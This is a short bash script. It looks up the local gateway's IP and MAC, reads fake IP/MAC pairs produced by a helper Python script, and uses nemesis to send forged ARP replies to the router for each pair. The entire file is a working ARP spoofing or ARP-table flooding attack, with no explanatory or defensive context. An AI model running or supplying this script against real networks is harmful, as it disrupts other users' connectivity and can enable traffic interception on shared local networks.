#!/bin/bash

router_ip=$(/usr/local/bin/nm-tool/usr/bin/nm-tool | grep Gateway|xargs echo | cut -d' ' -f2)

router_mac=$(arp-scan $router_ip | tail -n +3  | head -n -3 | cut -f2)

echo $router_ip $router_mac

python3 gen_fake_add.py > address

while read line 
do
	add=($line)
	ip=${add[0]}
	mac=${add[1]}
	echo $ip $mac
	nemesis arp -r -S $ip -D $router_ip -h $mac -m $router_mac
done <address
